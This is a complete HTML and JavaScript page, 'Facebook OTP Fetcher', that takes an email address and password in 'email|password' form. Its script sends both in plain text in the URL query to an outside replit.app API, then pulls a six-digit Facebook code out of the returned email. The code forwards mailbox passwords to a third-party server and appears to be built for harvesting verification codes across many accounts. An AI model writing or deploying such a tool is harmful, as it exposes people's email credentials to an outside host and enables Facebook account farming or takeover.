<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Code Finder Tool</title>
    <style>
        body { font-family: Arial, sans-serif; padding: 20px; background-color: #f4f4f4; text-align: center; }
        .container { max-width: 500px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0px 0px 10px rgba(0,0,0,0.1); }
        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; text-align: center; }
        button { background-color: #007bff; color: white; border: none; padding: 10px 20px; font-size: 16px; border-radius: 4px; cursor: pointer; }
        button:hover { background-color: #0056b3; }
        #code-display { margin-top: 20px; font-size: 24px; font-weight: bold; color: #28a745; min-height: 40px; }
    </style>
</head>
<body>

<div class="container">
    <h2>Facebook OTP Fetcher</h2>
    
    <input type="text" id="mail-input" placeholder="example@outlook.com|password123">
    <br>
    
    <button onclick="getFacebookCode()">Get Code</button>
    
    <div id="code-display">Your Code Will Show Here</div>
</div>

<script>
const baseApiUrl = "https://email-reader-api--turzokhan715.replit.app/api/email/search";

async function getFacebookCode() {
    const rawData = document.getElementById('mail-input').value; 
    
    if (!rawData || !rawData.includes('|')) {
        alert("Please enter input in 'email|password' format!");
        return;
    }

    const parts = rawData.split('|');
    const userEmail = parts[0].trim();
    const userPass = parts[1].trim();

    const finalUrl = `${baseApiUrl}?email=${encodeURIComponent(userEmail)}&password=${encodeURIComponent(userPass)}&query=Facebook`;
    
    try {
        document.getElementById('code-display').innerText = "Searching code, please wait...";
        
        const response = await fetch(finalUrl);
        const data = await response.json();
        
        if (data && data.length > 0) {
            const latestEmail = data[0];
            const emailText = latestEmail.body || latestEmail.subject || "";
            const codeMatch = emailText.match(/\d{6}/); 
            
            if (codeMatch) {
                document.getElementById('code-display').innerText = "OTP Code: " + codeMatch[0];
            } else {
                document.getElementById('code-display').innerText = "Code not found in email!";
            }
        } else {
            document.getElementById('code-display').innerText = "No Facebook emails found!";
        }
    } catch (error) {
        console.error("Error:", error);
        document.getElementById('code-display').innerText = "Connection failed or Login incorrect!";
    }
}
</script>
</body>
</html>
